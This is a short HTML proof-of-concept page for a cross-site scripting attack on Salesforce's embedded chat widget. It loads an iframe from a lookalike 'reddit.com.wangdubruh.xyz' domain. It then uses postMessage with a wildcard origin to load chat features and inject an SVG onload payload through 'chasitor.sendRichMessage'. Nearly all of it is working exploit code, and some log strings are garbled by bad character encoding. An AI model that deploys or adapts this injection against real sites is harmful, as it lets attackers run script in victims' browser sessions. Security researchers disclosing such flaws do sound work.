<!DOCTYPE html>
<html>
<head>
  <title>Salesforce XSS PoC</title>
  <style>
    iframe {
      width: 100%;
      height: 600px;
      border: 1px solid #ccc;
    }
  </style>
</head>
<body>
  <h2>Salesforce iframe XSS PoC</h2>

  <iframe id="eswFrame" src="https://reddit.com.wangdubruh.xyz" onload="runXSS()" allow="camera *; microphone *;"></iframe>

  <script>
    function runXSS() {
      const frame = document.getElementById("eswFrame");
      const origin = "*"; // safer: restrict if you know exact domain

      // Optional: attempt script.load if required (not mandatory for XSS in sendRichMessage)
      const features = ["chasitor", "filetransfer"];
      for (const feature of features) {
        frame.contentWindow.postMessage({
          method: "script.load",
          feature: feature
        }, origin);
        console.log(`ðŸ“¤ Sent script.load for feature: '${feature}'`);
      }

      // Wait a bit for scripts to load before attempting XSS
      setTimeout(() => {
        const payload = `"><svg/onload=alert('XSS')>`;

        const message = {
          method: "chasitor.sendRichMessage",
          domain: "reddit.com.wangdubruh.xyz", // replace with actual target domain if needed
          data: {
            type: "text",
            text: payload
          }
        };

        console.log("ðŸ“¤ Sending XSS payload via chasitor.sendRichMessage", message);
        frame.contentWindow.postMessage(message, origin);
      }, 1000);
    }
  </script>
</body>
</html>
